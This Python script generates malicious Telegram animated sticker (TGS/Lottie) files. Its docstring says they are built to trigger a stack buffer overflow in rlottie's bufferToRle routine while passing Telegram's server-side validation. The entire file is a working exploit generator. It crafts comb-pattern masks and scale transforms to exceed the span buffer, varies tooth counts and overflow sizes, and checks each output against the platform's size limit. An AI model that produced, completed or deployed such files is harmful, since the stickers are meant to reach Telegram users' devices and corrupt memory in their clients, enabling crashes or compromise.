#!/usr/bin/env python3
"""
Generate 25 TGS sticker variants that all trigger the rlottie bufferToRle
stack buffer overflow while passing Telegram server-side validation.

Telegram TGS requirements:
  - Canvas: 512x512
  - Framerate: 30 or 60
  - Duration: ≤ 3 seconds (op ≤ fr*3)
  - Compressed size: ≤ 64 KB
  - Bodymovin version: 5.x.x
  - No expressions, no image assets, no text layers

Overflow requirement:
  - >256 non-zero spans per scanline in rleOpGeneric
  - Achieved via mask Add + mask Difference(XOR) with comb pattern
  - Layer scale transform bypasses 512px canvas constraint

Variants explore different:
  - Teeth counts (overflow amounts)
  - Scale factors (2x, 3x, 4x)
  - Frame counts / durations
  - Comb orientations
  - Layer configurations
  - Shape content
  - Mask combinations
"""

import gzip
import io
import json
import os
import sys


def sv(v):
    """Static value."""
    return {"a": 0, "k": v}


def sp(p):
    """Static path."""
    return {"a": 0, "k": p}


def rect_path(x0, y0, x1, y1):
    verts = [[x0, y0], [x1, y0], [x1, y1], [x0, y1]]
    return {"i": [[0,0]]*4, "o": [[0,0]]*4, "v": verts, "c": True}


def comb_path_h(width, height, n_teeth, tooth_w=0.5):
    """Horizontal comb: teeth along X axis."""
    H = float(height)
    gap_w = (float(width) / n_teeth) - tooth_w
    verts = []
    for k in range(n_teeth):
        x = k * (tooth_w + gap_w)
        verts.append([x, 0.0])
        verts.append([x + tooth_w, 0.0])
        verts.append([x + tooth_w, H])
        verts.append([x + gap_w + tooth_w, H])
    verts.append([float(width), H])
    verts.append([0.0, H])
    n = len(verts)
    return {"i": [[0.0,0.0]]*n, "o": [[0.0,0.0]]*n, "v": verts, "c": True}


def comb_path_v(width, height, n_teeth, tooth_h=0.5):
    """Vertical comb: teeth along Y axis."""
    W = float(width)
    gap_h = (float(height) / n_teeth) - tooth_h
    verts = []
    for k in range(n_teeth):
        y = k * (tooth_h + gap_h)
        verts.append([0.0, y])
        verts.append([0.0, y + tooth_h])
        verts.append([W, y + tooth_h])
        verts.append([W, y + gap_h + tooth_h])
    verts.append([W, float(height)])
    verts.append([W, 0.0])
    n = len(verts)
    return {"i": [[0.0,0.0]]*n, "o": [[0.0,0.0]]*n, "v": verts, "c": True}


def comb_path_fine(width, height, n_teeth):
    """Fine comb from v3: teeth 0.5 units wide, 0.5 unit gaps."""
    H = float(height)
    verts = []
    for k in range(n_teeth):
        x = float(k)
        verts.append([x, 0.0])
        verts.append([x + 0.5, 0.0])
        verts.append([x + 0.5, H])
        verts.append([float(k + 1), H])
    verts.append([float(n_teeth), H])
    verts.append([0.0, H])
    n = len(verts)
    return {"i": [[0.0,0.0]]*n, "o": [[0.0,0.0]]*n, "v": verts, "c": True}


def make_layer(canvas_w, canvas_h, scale_x, scale_y, masks, shapes, name="L"):
    return {
        "ty": 4,
        "nm": name,
        "ind": 1,
        "st": 0,
        "ip": 0,
        "op": 2,
        "sr": 1,
        "ks": {
            "p": sv([0, 0, 0]),
            "a": sv([0, 0, 0]),
            "s": sv([scale_x * 100, scale_y * 100, 100]),
            "r": sv(0),
            "o": sv(100),
        },
        "hasMask": True,
        "masksProperties": masks,
        "shapes": shapes,
    }


def rect_shape(cx, cy, w, h, color):
    return {
        "ty": "gr", "nm": "G", "it": [
            {"ty": "rc", "nm": "R", "p": sv([cx, cy]), "s": sv([w, h]), "r": sv(0)},
            {"ty": "fl", "nm": "F", "c": sv(color), "o": sv(100), "r": 1},
        ]
    }


def ellipse_shape(cx, cy, w, h, color):
    return {
        "ty": "gr", "nm": "G", "it": [
            {"ty": "el", "nm": "E", "p": sv([cx, cy]), "s": sv([w, h])},
            {"ty": "fl", "nm": "F", "c": sv(color), "o": sv(100), "r": 1},
        ]
    }


def star_shape(cx, cy, r, color):
    return {
        "ty": "gr", "nm": "G", "it": [
            {"ty": "sr", "nm": "S", "p": sv([cx, cy]),
             "or": sv(r), "ir": sv(r * 0.4), "pt": sv(5),
             "os": sv(0), "is": sv(0), "r": sv(0), "sy": 1},
            {"ty": "fl", "nm": "F", "c": sv(color), "o": sv(100), "r": 1},
        ]
    }


def mask_add(path):
    return {"mode": "a", "inv": False, "pt": sp(path), "o": sv(100)}


def mask_diff(path):
    return {"mode": "f", "inv": False, "pt": sp(path), "o": sv(100)}


def mask_intersect(path):
    return {"mode": "i", "inv": False, "pt": sp(path), "o": sv(100)}


def mask_subtract(path):
    return {"mode": "s", "inv": False, "pt": sp(path), "o": sv(100)}


def build_lottie(layers, fr=60, op=2, name="sticker"):
    return {
        "v": "5.5.2",
        "fr": fr,
        "ip": 0,
        "op": op,
        "w": 512,
        "h": 512,
        "nm": name,
        "ddd": 0,
        "assets": [],
        "layers": layers,
    }


def save(lottie, name, outdir):
    json_bytes = json.dumps(lottie, separators=(",", ":")).encode()
    tgs_path = os.path.join(outdir, f"{name}.tgs")
    json_path = os.path.join(outdir, f"{name}.json")

    with open(json_path, "wb") as f:
        f.write(json_bytes)

    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(json_bytes)
    tgs_bytes = buf.getvalue()

    with open(tgs_path, "wb") as f:
        f.write(tgs_bytes)

    ok = len(tgs_bytes) <= 65536
    spans = "varies"
    return name, len(json_bytes), len(tgs_bytes), ok


# ─── Sticker variant definitions ───

def gen_variants():
    variants = []

    # --- Group 1: Classic 2x scale, varying teeth (overflow amount) ---
    for i, teeth in enumerate([257, 300, 350, 400, 450, 512]):
        W, H, S = 512, 512, 2.0
        comb = comb_path_fine(W, H, teeth)
        solid = rect_path(0, 0, W, H)
        shape = rect_shape(W/2, H/2, W, H, [1, 0, 0])
        layer = make_layer(W, H, S, S,
                           [mask_add(solid), mask_diff(comb)],
                           [shape], f"teeth_{teeth}")
        overflow = max(0, teeth - 256) * 8
        lottie = build_lottie([layer], name=f"2x_teeth{teeth}")
        variants.append((f"01_2x_teeth{teeth}", lottie,
                         f"2x scale, {teeth} teeth, {overflow}B overflow"))

    # --- Group 2: 3x scale, fewer teeth needed ---
    # 3x scale: effective width = 1536, but kBufferSize caps at 1024
    # With 3x, each 0.33-unit tooth → 1px after scale
    for i, teeth in enumerate([300, 400, 512]):
        W, H, S = 512, 512, 3.0
        comb = comb_path_fine(W, H, teeth)
        solid = rect_path(0, 0, W, H)
        shape = ellipse_shape(W/2, H/2, W, H, [0, 1, 0])
        layer = make_layer(W, H, S, S,
                           [mask_add(solid), mask_diff(comb)],
                           [shape], f"3x_{teeth}")
        lottie = build_lottie([layer], name=f"3x_teeth{teeth}")
        variants.append((f"07_3x_teeth{teeth}", lottie,
                         f"3x scale, {teeth} teeth"))

    # --- Group 3: 4x scale ---
    for i, teeth in enumerate([300, 512]):
        W, H, S = 512, 512, 4.0
        comb = comb_path_fine(W, H, teeth)
        solid = rect_path(0, 0, W, H)
        shape = rect_shape(W/2, H/2, W, H, [0, 0, 1])
        layer = make_layer(W, H, S, S,
                           [mask_add(solid), mask_diff(comb)],
                           [shape], f"4x_{teeth}")
        lottie = build_lottie([layer], name=f"4x_teeth{teeth}")
        variants.append((f"10_4x_teeth{teeth}", lottie,
                         f"4x scale, {teeth} teeth"))

    # --- Group 4: Asymmetric scale (only X scaled) ---
    W, H = 512, 512
    comb = comb_path_fine(W, H, 512)
    solid = rect_path(0, 0, W, H)
    shape = rect_shape(W/2, H/2, W, H, [1, 0.5, 0])
    layer = make_layer(W, H, 2.0, 1.0,
                       [mask_add(solid), mask_diff(comb)],
                       [shape], "asym_x")
    lottie = build_lottie([layer], name="asymmetric_x_only")
    variants.append(("12_asym_x_2x", lottie,
                     "2x scale X only, Y=1x"))

    # --- Group 5: Vertical comb (overflow along Y axis with Y scale) ---
    comb_v = comb_path_v(W, H, 512, tooth_h=0.5)
    solid = rect_path(0, 0, W, H)
    shape = rect_shape(W/2, H/2, W, H, [0.5, 0, 1])
    layer = make_layer(W, H, 1.0, 2.0,
                       [mask_add(solid), mask_diff(comb_v)],
                       [shape], "vert_comb")
    lottie = build_lottie([layer], name="vertical_comb")
    variants.append(("13_vert_comb_2x", lottie,
                     "Vertical comb, 2x Y scale"))

    # --- Group 6: Different mask mode combos ---
    # Subtract instead of Difference
    comb = comb_path_fine(W, H, 512)
    solid = rect_path(0, 0, W, H)
    shape = rect_shape(W/2, H/2, W, H, [0, 0.8, 0.8])
    layer = make_layer(W, H, 2.0, 2.0,
                       [mask_add(solid), mask_subtract(comb)],
                       [shape], "sub_mode")
    lottie = build_lottie([layer], name="subtract_mode")
    variants.append(("14_subtract_mode", lottie,
                     "mask subtract instead of diff"))

    # Intersect mode
    layer = make_layer(W, H, 2.0, 2.0,
                       [mask_add(solid), mask_intersect(comb)],
                       [shape], "int_mode")
    lottie = build_lottie([layer], name="intersect_mode")
    variants.append(("15_intersect_mode", lottie,
                     "mask intersect mode"))

    # --- Group 7: Multiple mask layers stacked ---
    # Two Add + two Diff = double the mask operations
    comb1 = comb_path_fine(W, H, 300)
    comb2 = comb_path_fine(W, H, 400)
    shape = rect_shape(W/2, H/2, W, H, [1, 1, 0])
    layer = make_layer(W, H, 2.0, 2.0,
                       [mask_add(solid), mask_diff(comb1),
                        mask_add(solid), mask_diff(comb2)],
                       [shape], "multi_mask")
    lottie = build_lottie([layer], name="multi_mask")
    variants.append(("16_multi_mask", lottie,
                     "4 masks: add+diff+add+diff"))

    # --- Group 8: Different shape content ---
    # Star shape
    comb = comb_path_fine(W, H, 512)
    star = star_shape(W/2, H/2, 200, [1, 0, 0.5])
    layer = make_layer(W, H, 2.0, 2.0,
                       [mask_add(solid), mask_diff(comb)],
                       [star], "star_shape")
    lottie = build_lottie([layer], name="star_content")
    variants.append(("17_star_shape", lottie,
                     "Star shape content"))

    # Ellipse shape
    ell = ellipse_shape(W/2, H/2, W*0.9, H*0.9, [0.2, 0.6, 1])
    layer = make_layer(W, H, 2.0, 2.0,
                       [mask_add(solid), mask_diff(comb)],
                       [ell], "ell_shape")
    lottie = build_lottie([layer], name="ellipse_content")
    variants.append(("18_ellipse_shape", lottie,
                     "Ellipse shape content"))

    # --- Group 9: Different framerates ---
    comb = comb_path_fine(W, H, 512)
    shape = rect_shape(W/2, H/2, W, H, [0.3, 0.3, 0.3])
    layer = make_layer(W, H, 2.0, 2.0,
                       [mask_add(solid), mask_diff(comb)],
                       [shape], "30fps")
    lottie = build_lottie([layer], fr=30, op=2, name="30fps_variant")
    variants.append(("19_30fps", lottie,
                     "30fps framerate"))

    # --- Group 10: Longer animations (still ≤ 3 seconds) ---
    # 60fps × 3s = 180 frames
    for frames in [60, 120, 180]:
        shape = rect_shape(W/2, H/2, W, H, [0.8, 0.2, 0.2])
        layer = make_layer(W, H, 2.0, 2.0,
                           [mask_add(solid), mask_diff(comb)],
                           [shape], f"dur_{frames}f")
        layer["op"] = frames
        lottie = build_lottie([layer], fr=60, op=frames,
                              name=f"duration_{frames}f")
        variants.append((f"20_dur_{frames}f", lottie,
                         f"{frames} frames @ 60fps = {frames/60:.1f}s"))

    # --- Group 11: Two independent overflow layers ---
    comb = comb_path_fine(W, H, 400)
    shape1 = rect_shape(W/2, H/2, W, H, [1, 0, 0])
    shape2 = ellipse_shape(W/2, H/2, W, H, [0, 0, 1])
    layer1 = make_layer(W, H, 2.0, 2.0,
                        [mask_add(solid), mask_diff(comb)],
                        [shape1], "L1")
    layer1["ind"] = 1
    layer2 = make_layer(W, H, 2.0, 2.0,
                        [mask_add(solid), mask_diff(comb)],
                        [shape2], "L2")
    layer2["ind"] = 2
    lottie = build_lottie([layer1, layer2], name="dual_layer")
    variants.append(("23_dual_layer", lottie,
                     "Two layers, each triggers overflow"))

    # --- Group 12: Fractional scale (2.5x) ---
    comb = comb_path_fine(W, H, 512)
    shape = rect_shape(W/2, H/2, W, H, [0.5, 1, 0.5])
    layer = make_layer(W, H, 2.5, 2.5,
                       [mask_add(solid), mask_diff(comb)],
                       [shape], "2.5x")
    lottie = build_lottie([layer], name="scale_2_5x")
    variants.append(("24_scale_2_5x", lottie,
                     "2.5x fractional scale"))

    # --- Group 13: Minimal overflow (just 1 span over) ---
    comb = comb_path_fine(W, H, 257)
    shape = rect_shape(W/2, H/2, W, H, [1, 1, 1])
    layer = make_layer(W, H, 2.0, 2.0,
                       [mask_add(solid), mask_diff(comb)],
                       [shape], "min_over")
    lottie = build_lottie([layer], name="minimal_overflow")
    variants.append(("25_minimal_1span", lottie,
                     "257 teeth = 1 span overflow (8 bytes)"))

    return variants


def main():
    outdir = os.path.dirname(os.path.abspath(__file__))

    variants = gen_variants()
    print(f"Generating {len(variants)} sticker variants...\n")
    print(f"{'Name':<25} {'JSON':>8} {'TGS':>8} {'OK':>4}  Description")
    print("-" * 85)

    all_ok = True
    for name, lottie, desc in variants:
        name, jsz, tsz, ok = save(lottie, name, outdir)
        status = "OK" if ok else "FAIL"
        if not ok:
            all_ok = False
        print(f"{name:<25} {jsz:>7,} {tsz:>7,} {status:>4}  {desc}")

    print(f"\nGenerated {len(variants)} variants in {outdir}/")
    if all_ok:
        print("All pass Telegram 64KB .tgs size limit.")
    else:
        print("WARNING: Some exceed 64KB limit!")


if __name__ == "__main__":
    main()
